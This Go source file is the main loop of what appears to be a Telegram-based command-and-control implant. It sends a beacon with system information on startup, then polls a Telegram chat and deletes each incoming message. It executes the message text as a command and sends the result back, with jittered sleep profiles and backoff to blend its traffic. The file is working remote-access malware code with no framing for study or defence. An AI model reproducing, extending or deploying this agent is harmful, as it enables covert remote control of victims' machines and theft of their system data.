package main

import (
	"fmt"
	"math/rand"
	"os"
	"time"

	"github.com/joho/godotenv"
)

// sleepWithProfile waits according to the active beacon profile.
func sleepWithProfile() {
	d := Profile.BaseSleep

	if Profile.JitterEnabled {
		min := Profile.JitterMin
		max := Profile.JitterMax

		if max > min {
			d += min + time.Duration(rand.Int63n(int64(max-min)))
		} else {
			d += min
		}
	}

	time.Sleep(d)
}

// startupBeacon sends an initial check-in message.
func startupBeacon() {
	info := sysInfo()

	msg := fmt.Sprintf(
		"🟢 Agent Online\n\nProfile: %s\n\n%s",
		Profile.Name,
		info,
	)

	if err := sendMessage(msg); err != nil {
		fmt.Println("[!] Startup beacon failed:", err)
	}
}

// backoffSleep performs exponential reconnect backoff.
func backoffSleep(errors int) {

	if !Profile.BackoffEnabled || errors <= 0 {
		sleepWithProfile()
		return
	}

	backoff := Profile.BackoffBase * (1 << (errors - 1))

	if backoff > Profile.BackoffMax {
		backoff = Profile.BackoffMax
	}

	fmt.Printf("[!] Poll failed (%d), retrying in %s\n", errors, backoff)

	time.Sleep(backoff)
}

// runAgent starts the Telegram polling loop.
func runAgent() {

	offset := 0
	errCount := 0

	for {

		updates, newOffset, err := getUpdates(offset)

		if err != nil {

			errCount++

			fmt.Printf("[!] Poll error #%d: %v\n", errCount, err)

			backoffSleep(errCount)

			continue
		}

		errCount = 0
		offset = newOffset

		for _, update := range updates {

			if update.Message.Text == "" {
				continue
			}

			if err := deleteMessage(update.Message.MessageID); err != nil {
				fmt.Println("[!] Delete failed:", err)
			}

			result := executeCommand(update.Message.Text)

			if result == "" {
				continue
			}

			if err := sendMessage(result); err != nil {
				fmt.Println("[!] Send failed:", err)
			}
		}

		sleepWithProfile()
	}
}

func main() {

	// Load .env (ignored if file does not exist)
	_ = godotenv.Load()

	// Initialize credentials from environment
	TOKEN = os.Getenv("TELEGRAM_BOT_TOKEN")
	CHAT_ID = os.Getenv("TELEGRAM_CHAT_ID")

	// Validate credentials
	if TOKEN == "" || CHAT_ID == "" {
		fmt.Println("[!] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set")
		return
	}

	// Load beacon profile
	if err := LoadProfile(); err != nil {
		fmt.Println("[!]", err)
		return
	}

	rand.Seed(time.Now().UnixNano())

	fmt.Println("[*] Telegram Agent Started")
	fmt.Printf("[*] Active Profile : %s\n", Profile.Name)

	startupBeacon()

	runAgent()
}
